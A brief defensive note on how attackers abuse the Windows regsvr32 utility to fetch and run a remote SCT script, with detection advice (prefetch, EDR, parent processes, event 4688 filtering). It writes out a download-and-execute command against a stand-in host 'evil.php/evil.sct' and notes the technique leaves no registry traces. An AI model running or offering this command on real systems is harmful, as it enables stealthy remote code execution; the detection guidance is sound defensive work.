In computing, regsvr32 (Microsoft Register Server) is a command-line utility in Microsoft Windows operating systems 
for registering and unregistering DLLs and ActiveX controls in the Windows Registry.Adversaries can still use Regsvr32.exe on Windows
to download and execute files

Usage:
regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll

regsvr32 is invoking scrobj.dll to unregister COM objects defined in the evil.sct. Malicious code will be used in the sct file.
The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.
It doesnâ€™t have to be .sct. There will be no artifacts left in registry if this utility is unregistering any COM object.


Detection:
1.Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file. 
2.Command execution and arguments passed to regsvr32.exe using EDR solutions.
3.Look for suspicious process in the system with parent process as regsvr32.
4. Hunt for Windows event id 4688 and filter the command arguments with following filter
regSvr32 /s /n /u /i:http

Note: This utility invokes default HTTP useragent based on your system settings.

  Detailed Tracking have to be enabled for recording process command arguments.
